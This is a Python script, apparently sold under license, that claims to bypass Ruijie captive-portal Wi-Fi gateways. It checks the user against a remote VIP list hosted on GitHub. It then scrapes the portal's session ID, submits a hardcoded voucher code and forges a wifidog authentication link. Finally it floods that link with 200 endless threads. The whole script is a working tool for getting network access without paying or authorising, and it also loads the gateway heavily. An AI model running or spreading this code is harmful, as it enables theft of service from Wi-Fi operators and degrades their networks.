import requests, re, urllib3, time, threading, os, random, subprocess, sys
from urllib.parse import urlparse, parse_qs, urljoin
from datetime import datetime

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# --- COLORS ---
Y, G, R, W, C, M, OFF = "\033[1;33m", "\033[1;32m", "\033[1;31m", "\033[1;37m", "\033[1;36m", "\033[1;35m", "\033[0m"

# --- CONFIG ---
VIP_URL = "https://raw.githubusercontent.com/painglintun895-rgb/my-keys/refs/heads/main/vips.txt"
OFFLINE_EXP = "2026-05-01 12:00"

def get_uid():
    try: return subprocess.check_output(['whoami']).decode('utf-8').strip()
    except: return "u0_a232"

def banner(name="GUEST", exp="----/--/-- --:--"):
    os.system('clear')
    print(f"{Y}      ██████╗ ██╗   ██╗██╗     ██╗██╗███████╗")
    print(f"{Y}      ██╔══██╗██║   ██║██║     ██║██║██╔════╝")
    print(f"{G}      ██████╔╝██║   ██║██║     ██║██║█████╗  ")
    print(f"{G}      ██╔══██╗██║   ██║██║██   ██║██║██╔══╝  ")
    print(f"{R}      ██║  ██║╚██████╔╝██║╚█████╔╝██║███████╗")
    print(f"{R}      ╚═╝  ╚═╝ ╚═════╝ ╚═╝ ╚════╝ ╚═╝╚══════╝")
    print(f"{W}╔" + "═"*60 + "╗")
    print(f"{W}║ {Y}⚡ USER ID : {Y}{get_uid():<39} {W}║")
    print(f"{W}║ {G}⚡ NAME    : {G}{name:<39} {W}║")
    print(f"{W}║ {R}⚡ EXPIRE  : {R}{exp:<39} {W}║")
    print(f"{W}╚" + "═"*60 + "╝\n")

def check_access():
    uid = get_uid()
    now = datetime.now()
    try:
        res = requests.get(f"{VIP_URL}?t={random.random()}", timeout=5, verify=False)
        if res.status_code == 200:
            for line in res.text.splitlines():
                if uid in line:
                    parts = line.split('|')
                    v_name = parts[1].strip()
                    v_exp_str = parts[2].strip()
                    expire_time = datetime.strptime(v_exp_str, "%Y-%m-%d %H:%M")
                    banner(v_name, v_exp_str)
                    if now < expire_time:
                        return True
                    else:
                        print(f" {R}[!] EXPIRED ON SERVER!{OFF}"); sys.exit()
        raise Exception("Not found")
    except:
        expire_time = datetime.strptime(OFFLINE_EXP, "%Y-%m-%d %H:%M")
        banner("OFFLINE USER", OFFLINE_EXP)
        if now < expire_time: return True
        else: print(f" {R}[!] ALL LICENSES EXPIRED!{OFF}"); sys.exit()

def turbo_pulse(link):
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
        "Connection": "keep-alive"
    }
    while True:
        try:
            requests.get(link, timeout=5, verify=False, headers=headers)
            print(f" {Y}[{G}✓{R}] {W}TURBO BYPASS ACTIVE >>> {C}[{random.randint(10,60)}ms]  {OFF}", end="\r")
        except: time.sleep(0.5)

def start_speed_logic():
    session = requests.Session()
    try:
        print(f" {W}[*] {C}Bypassing Ruijie Gateways...{OFF}")
        r = requests.get("http://connectivitycheck.gstatic.com/generate_204", allow_redirects=True, timeout=5)
        p_url = r.url
        
        r1 = session.get(p_url, verify=False, timeout=6)
        m = re.search(r"location\.href\s*=\s*['\"]([^'\"]+)['\"]", r1.text)
        n_url = urljoin(p_url, m.group(1)) if m else p_url
        
        r2 = session.get(n_url, verify=False, timeout=6)
        sid = parse_qs(urlparse(r2.url).query).get('sessionId', [None])[0]
        
        if sid:
            print(f" {G}[✓] Master SID: {sid[:15]} Authorized{OFF}")
            p_host = f"{urlparse(p_url).scheme}://{urlparse(p_url).netloc}"
            session.post(f"{p_host}/api/auth/voucher/", json={'accessCode': '123456', 'sessionId': sid, 'apiVersion': 1}, timeout=5)
            
            gw = parse_qs(urlparse(p_url).query).get('gw_address', [urlparse(p_url).netloc.split(':')[0]])[0]
            port = parse_qs(urlparse(p_url).query).get('gw_port', ['2060'])[0]
            auth_link = f"http://{gw}:{port}/wifidog/auth?token={sid}&phonenumber=12345"
            
            print(f" {M}[*] ⚡ Speed Boost: 200 Heavy Threads Active ⚡{OFF}")
            for _ in range(200):
                threading.Thread(target=turbo_pulse, args=(auth_link,), daemon=True).start()
            
            while True:
                time.sleep(3)
                try:
                    if requests.get("http://www.google.com/generate_204", timeout=5).status_code != 204: break
                except: break
        else:
            print(f" {R}[!] Session ID not found. Retrying...{OFF}")
            time.sleep(2)
            start_speed_logic()
    except Exception as e:
        time.sleep(3)
        start_speed_logic()

if __name__ == "__main__":
    if check_access():
        start_speed_logic()
